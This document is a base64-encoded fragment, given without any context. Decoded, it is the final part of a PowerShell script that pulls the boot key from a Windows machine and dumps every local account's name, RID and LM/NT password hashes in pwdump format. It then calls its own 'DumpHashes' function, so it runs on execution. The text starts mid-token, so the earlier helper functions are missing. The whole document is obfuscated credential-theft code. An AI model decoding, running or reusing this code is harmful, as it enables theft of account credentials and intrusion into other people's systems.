Qge1tDb252ZXJ0XTo6VG9JbnQzMigkdGhpcy5QU0NoaWxkTmFtZSwgMTYpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFYge1tieXRlW11dKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IFVzZXJOYW1lIHtHZXQtVXNlck5hbWUoJHRoaXMuR2V0VmFsdWUoIlYiKSl9IC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgSGFzaE9mZnNldCB7W0JpdENvbnZlcnRlcl06OlRvVUludDMyKCR0aGlzLkdldFZhbHVlKCJWIilbMHg5Yy4uMHg5Zl0sMCkgKyAweENDfSAtUGFzc1RocnUKfQoKZnVuY3Rpb24gRHVtcEhhc2hlcwp7CiAgICBMb2FkQXBpCiAgICAkYm9vdGtleSA9IEdldC1Cb290S2V5OwogICAgJGhib290S2V5ID0gR2V0LUhCb290S2V5ICRib290a2V5OwogICAgR2V0LVVzZXJLZXlzIHwgJXsKICAgICAgICAkaGFzaGVzID0gR2V0LVVzZXJIYXNoZXMgJF8gJGhCb290S2V5OwogICAgICAgICJ7MH06ezF9OnsyfTp7M306OjoiIC1mICgkXy5Vc2VyTmFtZSwkXy5SaWQsIAogICAgICAgICAgICBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1swXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSwgCiAgICAgICAgICAgIFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaGVzWzFdKS5SZXBsYWNlKCItIiwiIikuVG9Mb3dlcigpKTsKICAgIH0KfQpEdW1wSGFzaGVzCg==
